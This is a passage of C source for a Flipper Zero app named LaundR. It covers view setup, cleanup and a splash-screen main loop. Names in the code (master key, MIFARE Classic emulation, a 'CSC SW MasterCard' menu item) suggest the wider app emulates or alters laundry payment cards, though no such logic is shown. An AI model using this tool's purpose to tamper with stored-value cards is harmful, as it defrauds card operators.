    app->view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_set_event_callback_context(app->view_dispatcher, app);
    view_dispatcher_set_custom_event_callback(app->view_dispatcher, laundr_custom_event_callback);

    app->submenu = submenu_alloc();

    view_dispatcher_add_view(
        app->view_dispatcher, LaundRViewSubmenu, submenu_get_view(app->submenu));
    view_set_previous_callback(submenu_get_view(app->submenu), laundr_exit_callback);

    // Build initial menu
    laundr_rebuild_submenu(app);

    app->widget = widget_alloc();
    view_dispatcher_add_view(
        app->view_dispatcher, LaundRViewWidget, widget_get_view(app->widget));
    view_set_context(widget_get_view(app->widget), app);
    view_set_previous_callback(widget_get_view(app->widget), laundr_back_to_submenu_callback);
    view_set_input_callback(widget_get_view(app->widget), laundr_widget_input_callback);

    app->master_key_widget = widget_alloc();
    view_dispatcher_add_view(
        app->view_dispatcher, LaundRViewMasterKey, widget_get_view(app->master_key_widget));
    view_set_context(widget_get_view(app->master_key_widget), app);
    view_set_previous_callback(widget_get_view(app->master_key_widget), laundr_back_to_submenu_callback);
    view_set_input_callback(widget_get_view(app->master_key_widget), laundr_master_key_input_callback);

    app->text_box = text_box_alloc();
    view_dispatcher_add_view(
        app->view_dispatcher, LaundRViewTextBox, text_box_get_view(app->text_box));
    view_set_previous_callback(text_box_get_view(app->text_box), laundr_textbox_back_callback);
    // TextBox handles scrolling internally - NO input callback needed

    app->text_input = text_input_alloc();
    view_dispatcher_add_view(
        app->view_dispatcher, LaundRViewTextInput, text_input_get_view(app->text_input));
    view_set_context(text_input_get_view(app->text_input), app);
    view_set_previous_callback(text_input_get_view(app->text_input), laundr_back_to_submenu_callback);
    // TextInput handles all input internally - NO custom input callback needed

    app->byte_input = byte_input_alloc();
    view_dispatcher_add_view(
        app->view_dispatcher, LaundRViewByteInput, byte_input_get_view(app->byte_input));
    view_set_context(byte_input_get_view(app->byte_input), app);
    view_set_previous_callback(byte_input_get_view(app->byte_input), laundr_back_to_submenu_callback);
    // ByteInput handles all input internally - NO custom input callback needed

    app->popup = popup_alloc();
    view_dispatcher_add_view(
        app->view_dispatcher, LaundRViewPopup, popup_get_view(app->popup));
    view_set_context(popup_get_view(app->popup), app);
    view_set_previous_callback(popup_get_view(app->popup), laundr_popup_back_callback);

    Gui* gui = furi_record_open(RECORD_GUI);
    view_dispatcher_attach_to_gui(app->view_dispatcher, gui, ViewDispatcherTypeFullscreen);

    view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewSubmenu);

    // Allocate deferred stop timer
    app->stop_timer = furi_timer_alloc(laundr_deferred_stop_callback, FuriTimerTypeOnce, app);

    // Load historical transaction stats from CSV
    laundr_load_historical_stats(app);

    return app;
}

static void laundr_app_free(LaundRApp* app) {
    // Stop and free deferred stop timer
    if(app->stop_timer) {
        furi_timer_stop(app->stop_timer);
        furi_timer_free(app->stop_timer);
        app->stop_timer = NULL;
    }

    // Stop and free transaction monitor timer
    if(app->transaction_monitor_timer) {
        furi_timer_stop(app->transaction_monitor_timer);
        furi_timer_free(app->transaction_monitor_timer);
        app->transaction_monitor_timer = NULL;
    }

    // Stop emulation if active
    laundr_stop_emulation(app);

    // Free MfClassic data
    if(app->mfc_data) {
        mf_classic_free(app->mfc_data);
        app->mfc_data = NULL;
    }

    // Free NFC device
    if(app->nfc_device) {
        nfc_device_free(app->nfc_device);
        app->nfc_device = NULL;
    }

    // Free NFC
    if(app->nfc) {
        nfc_free(app->nfc);
        app->nfc = NULL;
    }

    // Stop notifications
    if(app->notifications) {
        notification_message(app->notifications, &sequence_blink_stop);
    }

    // Remove all views from dispatcher (don't call stop - it's already stopped)
    if(app->view_dispatcher) {
        view_dispatcher_remove_view(app->view_dispatcher, LaundRViewSubmenu);
        view_dispatcher_remove_view(app->view_dispatcher, LaundRViewWidget);
        view_dispatcher_remove_view(app->view_dispatcher, LaundRViewMasterKey);
        view_dispatcher_remove_view(app->view_dispatcher, LaundRViewTextBox);
        view_dispatcher_remove_view(app->view_dispatcher, LaundRViewTextInput);
        view_dispatcher_remove_view(app->view_dispatcher, LaundRViewByteInput);
        view_dispatcher_remove_view(app->view_dispatcher, LaundRViewPopup);
    }

    // Free view modules
    if(app->submenu) submenu_free(app->submenu);
    if(app->widget) widget_free(app->widget);
    if(app->master_key_widget) widget_free(app->master_key_widget);
    if(app->text_box) text_box_free(app->text_box);
    if(app->text_input) text_input_free(app->text_input);
    if(app->byte_input) byte_input_free(app->byte_input);
    if(app->popup) popup_free(app->popup);

    // Free view dispatcher
    if(app->view_dispatcher) view_dispatcher_free(app->view_dispatcher);

    // Close all records
    if(app->dialogs) furi_record_close(RECORD_DIALOGS);
    if(app->storage) furi_record_close(RECORD_STORAGE);
    if(app->notifications) furi_record_close(RECORD_NOTIFICATION);
    furi_record_close(RECORD_GUI);

    // Free strings
    if(app->file_path) furi_string_free(app->file_path);
    if(app->shadow_path) furi_string_free(app->shadow_path);
    if(app->text_box_store) furi_string_free(app->text_box_store);

    free(app);
}

// ============================================================================
// MAIN
// ============================================================================

int32_t laundr_app(void* p) {
    UNUSED(p);

    FURI_LOG_I(TAG, "LaundR v%s starting (built %s %s)", LAUNDR_VERSION, LAUNDR_BUILD_DATE, LAUNDR_BUILD_TIME);
    laundr_log_system("======================================");
    laundr_log_system("LaundR v%s STARTED", LAUNDR_VERSION);
    laundr_log_system("Built: %s %s", LAUNDR_BUILD_DATE, LAUNDR_BUILD_TIME);
    laundr_log_system("======================================");

    LaundRApp* app = laundr_app_alloc();

    if(!app) {
        FURI_LOG_E(TAG, "Failed to allocate app");
        laundr_log_system("ERROR: Failed to allocate app");
        return -1;
    }

    laundr_log_system("App allocated successfully");

    // Show splash screen
    if(app->widget && app->view_dispatcher) {
        widget_reset(app->widget);
        widget_add_string_element(
            app->widget, 64, 10, AlignCenter, AlignTop, FontPrimary, "LaundR");
        widget_add_string_element(
            app->widget, 64, 22, AlignCenter, AlignTop, FontSecondary, LAUNDR_CODENAME);
        widget_add_string_element(
            app->widget, 64, 32, AlignCenter, AlignTop, FontSecondary, "v" LAUNDR_VERSION);

        // Show build date and time
        char build_info[64];
        snprintf(build_info, sizeof(build_info), "Built: %s", LAUNDR_BUILD_DATE);
        widget_add_string_element(
            app->widget, 64, 44, AlignCenter, AlignTop, FontSecondary, build_info);
        widget_add_string_element(
            app->widget, 64, 54, AlignCenter, AlignTop, FontSecondary, LAUNDR_BUILD_TIME);

        view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewWidget);

        // Subscribe to input events to detect key presses
        FuriPubSub* input_events = furi_record_open(RECORD_INPUT_EVENTS);
        FuriPubSubSubscription* input_subscription =
            furi_pubsub_subscribe(input_events, splash_input_callback, NULL);

        // Reset splash action
        splash_action = SplashActionNone;

        // Wait up to 3 seconds OR until user presses a key
        uint32_t start_tick = furi_get_tick();
        while(splash_action == SplashActionNone) {
            uint32_t elapsed = furi_get_tick() - start_tick;
            if(elapsed >= 3000) {  // 3 seconds in ms
                break;
            }
            furi_delay_ms(10);  // Small delay to allow event processing
        }

        // Unsubscribe from input events
        furi_pubsub_unsubscribe(input_events, input_subscription);
        furi_record_close(RECORD_INPUT_EVENTS);

        // Wait for input event cycle to complete (Press→Short→Release)
        // This prevents the dismissal key from bleeding into the menu
        furi_delay_ms(150);

        // Switch to submenu
        view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewSubmenu);
    }

    // Auto-load disabled in v5.23 - use "CSC SW MasterCard" menu item instead
    laundr_log_system("Auto-load disabled - use menu to load cards");

    laundr_log_system("Starting view dispatcher run loop");
    // Start directly on main menu
    view_dispatcher_run(app->view_dispatcher);

    laundr_log_system("View dispatcher exited - cleaning up");
    laundr_app_free(app);

    FURI_LOG_I(TAG, "LaundR stopped");
    laundr_log_system("LaundR STOPPED");
    laundr_log_system("======================================");

    return 0;
}
